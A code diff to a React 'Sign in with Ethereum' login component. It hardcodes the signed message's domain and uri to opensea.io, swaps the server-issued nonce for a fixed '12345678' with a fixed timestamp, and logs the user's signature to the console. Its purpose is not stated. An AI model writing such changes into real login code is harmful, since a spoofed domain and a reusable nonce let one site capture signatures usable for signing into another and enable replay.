@@ -17,18 +17,27 @@ function Siwe() {
   const handleLogin = async () => {
     try {
       const callbackUrl = "/protected"
+      console.log('window.location.host', window.location.host);
+      console.log('window.location.origin', window.location.origin);
       const message = new SiweMessage({
-        domain: window.location.host,
+        domain: 'https://opensea.io',
+        // domain: 'opensea.io',
         address: address,
         statement: "Sign in with Ethereum to the app.",
-        uri: window.location.origin,
+        // uri: window.location.origin,
+        uri: 'https://opensea.io',
         version: "1",
         chainId: chain?.id,
-        nonce: await getCsrfToken(),
+        nonce: '12345678',
+        issuedAt: '2024-03-10T01:08:50.113Z'
       })
+      console.log('message.prepareMessage()', message.prepareMessage());
+
       const signature = await signMessageAsync({
         message: message.prepareMessage(),
       })
+      console.log('signature', signature);
+
       signIn("credentials", {
         message: JSON.stringify(message),
         redirect: false,
